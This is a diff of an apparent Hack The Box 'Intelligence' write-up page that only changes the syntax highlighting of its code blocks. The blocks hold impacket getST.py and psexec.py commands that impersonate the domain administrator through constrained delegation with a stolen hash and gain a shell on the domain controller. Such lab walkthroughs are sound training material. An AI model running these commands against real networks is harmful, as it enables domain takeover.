@@ -390,15 +390,15 @@ Host script results:
 
 <p>We will first request the ticket using <a href="https://github.com/SecureAuthCorp/impacket"><strong>impacket</strong></a>’s <code class="language-plaintext highlighter-rouge">getST.py</code> script</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getST.py -dc-ip 10.10.10.248 -spn 'WWW/dc.intelligence.htb' -impersonate administrator intelligence.htb/'svc_int$' -hashes :6bf735e60852b92212d512a4deadcfea
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getST.py <span class="nt">-dc-ip</span> 10.10.10.248 <span class="nt">-spn</span> <span class="s1">'WWW/dc.intelligence.htb'</span> <span class="nt">-impersonate</span> administrator intelligence.htb/<span class="s1">'svc_int$'</span> <span class="nt">-hashes</span> :6bf735e60852b92212d512a4deadcfea
 </code></pre></div></div>
 
 <p><img src="/assets/Intelligence/getting-admin-ticket.jpg" alt="getting-admin-ticket" /></p>
 
 <p>The ticket is now saved to disk. We’re going to export it to our environment and use it to own the box:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export KRB5CCNAME=&lt;path/to/ticket&gt;
-psexec.py -k -no-pass intelligence.htb/administrator@dc.intelligence.htb
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>&lt;path/to/ticket&gt;
+psexec.py <span class="nt">-k</span> <span class="nt">-no-pass</span> intelligence.htb/administrator@dc.intelligence.htb
 </code></pre></div></div>
 
 <p><img src="/assets/Intelligence/box-owned.jpg" alt="box-owned" /></p>
